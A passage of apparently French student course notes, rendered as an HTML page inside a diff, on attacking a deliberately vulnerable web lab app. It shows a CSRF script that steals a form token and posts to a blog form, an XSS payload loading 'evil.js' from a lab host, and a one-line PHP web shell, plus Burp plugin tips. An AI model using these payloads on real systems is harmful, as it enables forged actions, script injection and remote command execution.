+<span class="nx">myxhrGET</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">myxhrGET</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">DONE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">myresponse</span> <span class="o">=</span> <span class="nx">myxhrGET</span><span class="p">.</span><span class="nx">response</span><span class="p">;</span>
+        <span class="kd">var</span> <span class="nx">mytoken</span> <span class="o">=</span> <span class="nx">myresponse</span><span class="p">.</span><span class="nx">getElementsByName</span><span class="p">(</span><span class="s2">&quot;xsrf_token&quot;</span><span class="p">)[</span><span class="mf">0</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
+        <span class="nx">do_xsrf</span><span class="p">(</span><span class="nx">mytoken</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nx">myxhrGET</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="nx">myuriGET</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<span class="nx">myxhrGET</span><span class="p">.</span><span class="nx">responseType</span> <span class="o">=</span> <span class="s2">&quot;document&quot;</span><span class="p">;</span>
+<span class="nx">myxhrGET</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+<span class="kd">function</span> <span class="nx">do_xsrf</span><span class="p">(</span><span class="nx">mytoken</span><span class="p">){</span>
+    <span class="kd">var</span> <span class="nx">myxhrPOST</span> <span class="o">=</span> <span class="ow">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+    <span class="nx">myuriPOST</span> <span class="o">=</span> <span class="s1">&#39;http://192.168.0.1:8082/index.php?page=add-to-your-blog.php&amp;done=byxsrf&#39;</span><span class="p">;</span>
+    <span class="nx">myxhrPOST</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span><span class="nx">myuriPOST</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
+    <span class="nx">mypayload</span> <span class="o">=</span> <span class="s1">&#39;input=ISEN4EVER&amp;Submit_button=Submit&amp;xsrf_token=&#39;</span><span class="o">+</span><span class="nx">mytoken</span><span class="p">;</span>
+    <span class="nx">myxhrPOST</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s1">&#39;Content-type&#39;</span><span class="p">,</span><span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">);</span>
+    <span class="nx">myxhrPOST</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s1">&#39;Content-length&#39;</span><span class="p">,</span><span class="nx">mypayload</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+    <span class="nx">myxhrPOST</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s1">&#39;Connection&#39;</span><span class="p">,</span> <span class="s1">&#39;close&#39;</span><span class="p">);</span>
+    <span class="nx">myxhrPOST</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
+    <span class="p">}</span>
+    <span class="nx">myxhrPOST</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">mypayload</span><span class="p">);</span>
+    <span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Success...!&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></p>
+<p><code>&lt;script src ="http://192.168.0.1:81/evil.js"&gt;&lt;/script&gt;</code> permet d'exécuter</p>
+<p><code>http://192.168.0.1:81/index.php?page=browser-info.php#&lt;script src ="http://192.168.0.1:81/evil.js"&gt;&lt;/script&gt;</code> permet de faire exécuter la commande a distance.</p>
+<?php passthru($_GET['cmd']); ?>
+
+<h2 id="tips">Tips</h2>
+<div class="admonition plugins">
+<p class="admonition-title">Plugins</p>
+<p>Dans l'Extender de BURP il est aisément possible d'ajouter des plugins,<br />
+Notamment le Déserialisation utile pour le TP #deserialization</p>
+</div>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+        
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <nav class="md-footer__inner md-grid" aria-label="Footer">
+      
+        
+        <a href="../.." class="md-footer__link md-footer__link--prev" aria-label="Previous: Accueil" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Accueil
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../devOps/" class="md-footer__link md-footer__link--next" aria-label="Next: Developpement Opérationnel" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              Developpement Opérationnel
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            &copy; 2020 Louison SARLIN--MAGNUS
+          </div>
+        
+        
+          Made with
+          <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+            Material for MkDocs
+          </a>
+        
+        
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../..", "features": [], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../assets/javascripts/workers/search.fcfe8b6d.min.js", "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.b1047164.min.js"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+      
+        <script src="https://unpkg.com/mermaid@7.1.2/dist/mermaid.min.js"></script>
+      
+    
+  </body>
+</html>
